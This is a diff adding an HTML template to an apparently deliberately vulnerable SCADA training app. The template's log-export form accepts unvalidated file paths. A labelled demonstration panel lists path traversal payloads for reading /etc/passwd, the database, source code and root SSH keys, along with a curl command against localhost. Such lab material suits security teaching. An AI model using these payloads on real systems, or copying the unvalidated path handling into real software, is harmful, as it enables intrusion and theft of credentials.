@@ -1,0 +1,96 @@
+{% extends "base.html" %}
+
+{% block title %}Export Logs - SCADA Alarm Management{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>Export System Logs</h2>
+    
+    <form method="POST" action="{{ url_for('export_logs') }}">
+        <div class="form-group">
+            <label for="log_file">Select Log File</label>
+            <select id="log_file" name="log_file">
+                {% for file in log_files %}
+                <option value="{{ file }}">{{ file }}</option>
+                {% endfor %}
+                <option value="alarm.log">alarm.log</option>
+                <option value="system.log">system.log</option>
+                <option value="access.log">access.log</option>
+                <option value="error.log">error.log</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label for="custom_path">Or Enter Custom Path</label>
+            <input type="text" id="custom_path" name="log_file" 
+                   placeholder="logs/custom.log">
+            <small style="color: #666; display: block; margin-top: 0.5rem;">
+                Enter relative path from logs directory
+            </small>
+        </div>
+        
+        <button type="submit" class="btn btn-primary">Download Log File</button>
+    </form>
+</div>
+
+<div class="card" style="background: #fff3cd; border: 2px solid #ffc107;">
+    <h3 style="color: #856404;">⚠️ VULNERABILITY DEMONSTRATION</h3>
+    <p style="color: #856404; margin-top: 1rem;">
+        <strong>Path Traversal (Directory Traversal):</strong> This endpoint doesn't validate file paths, 
+        allowing access to any file on the system.
+    </p>
+    
+    <details style="margin-top: 1rem;">
+        <summary style="cursor: pointer; color: #667eea; font-weight: bold;">Show Attack Payloads</summary>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 1: Read /etc/passwd</h4>
+            <p style="margin-bottom: 0.5rem;">Payload: <code>../../../../../../etc/passwd</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Read system password file</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 2: Read Database File</h4>
+            <p style="margin-bottom: 0.5rem;">Payload: <code>../scada_alarms.db</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Download the entire database</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 3: Read Application Source</h4>
+            <p style="margin-bottom: 0.5rem;">Payload: <code>../app.py</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Access source code and discover more vulnerabilities</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 4: Read SSH Keys</h4>
+            <p style="margin-bottom: 0.5rem;">Payload: <code>../../../../../../root/.ssh/id_rsa</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Steal private SSH keys</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Testing with curl:</h4>
+            <pre style="background: white; padding: 0.5rem; border-radius: 3px; overflow-x: auto;">
+curl -X POST http://localhost:5000/export_logs \
+  -H "Cookie: session=YOUR_SESSION_COOKIE" \
+  -d "log_file=../../../../../../etc/passwd" \
+  --output passwd.txt
+            </pre>
+        </div>
+    </details>
+</div>
+
+<div class="card">
+    <h2>Available Log Files</h2>
+    {% if log_files %}
+    <ul style="list-style: none; padding: 0;">
+        {% for file in log_files %}
+        <li style="padding: 0.5rem; border-bottom: 1px solid #eee;">
+            📄 {{ file }}
+        </li>
+        {% endfor %}
+    </ul>
+    {% else %}
+    <p style="color: #666; text-align: center; padding: 2rem;">No log files available</p>
+    {% endif %}
+</div>
+{% endblock %}
